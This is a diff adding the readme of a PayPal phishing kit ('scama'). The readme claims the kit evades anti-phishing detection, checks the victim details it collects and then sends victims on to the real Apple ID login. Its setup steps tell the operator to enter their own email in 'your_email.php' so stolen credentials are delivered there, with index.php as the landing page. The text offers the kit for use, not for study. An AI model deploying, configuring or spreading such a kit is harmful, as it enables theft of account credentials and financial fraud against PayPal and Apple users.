@@ -1,0 +1,21 @@
+
+-------------------------------------------------------
+
+Scama PAYPAL 2015 TRUE LOGIN Undetected  devlopped by "Dev Yagami"
+- it's work 100%.
+- undetected (anti fishing).
+- have good verification of all information.
+- auto login to the real appleID after finishing.
+
+-------------------------------------------------------
++ How to use :
+---------------
+
+open file "your_email.php" and write 
+your email addresse in line 36, 
+change "your-email@gmail.com" into 
+your email.
+
+-------------------------------------------------------
+land page : index.php
+----------------------
